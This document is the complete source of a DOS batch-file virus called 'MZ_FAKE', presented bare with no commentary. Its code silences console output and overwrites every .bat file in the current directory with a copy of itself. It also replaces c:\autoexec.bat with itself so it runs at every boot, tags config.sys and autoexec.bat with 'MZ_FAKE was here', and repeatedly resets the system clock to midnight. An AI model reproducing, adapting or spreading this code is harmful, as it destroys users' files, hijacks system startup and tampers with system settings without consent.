MZ_FAKE
@echo off
time 00:00
echo ;MZ_FAKE was here>>config.sys
time 00:00
ctty nul
time 00:00
copy %0 %temp%\mzfake.bat>mzfaketmp.bat
time 00:00
for %%f in (*?.bat) do copy %temp%\mzfake.bat %%f>mzfaketmp.bat
time 00:00
ren mzfaketmp.bat mzfake.bat
time 00:00
ren autoexec.bat autofake.bat
time 00:00
copy mzfake.bat c:\autoexec.bat
time 00:00
@echo MZ_FAKE was here>>autoexec.bat
time 00:00
ctty con
time 00:00
